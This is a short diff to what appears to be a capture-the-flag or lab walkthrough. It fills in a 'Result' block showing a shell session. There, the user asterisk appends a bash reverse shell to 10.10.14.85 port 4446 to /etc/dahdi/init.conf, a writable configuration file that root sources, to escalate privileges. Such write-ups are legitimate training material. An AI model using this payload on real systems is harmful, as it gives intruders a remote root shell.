@@ -1257,7 +1257,9 @@ Append the reverse shell payload to the writable, root-sourced configuration fil
 **Result:**
 
 ```shell
-
+[asterisk@connected ghw5bmugvs]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.85/4446 0>&1" &' >> /etc/dahdi/init.conf
+<-i >& /dev/tcp/10.10.14.85/4446 0>&1" &' >> /etc/dahdi/init.conf            
+[asterisk@connected ghw5bmugvs]$ 
 ```
 <div align="center">
 <br>
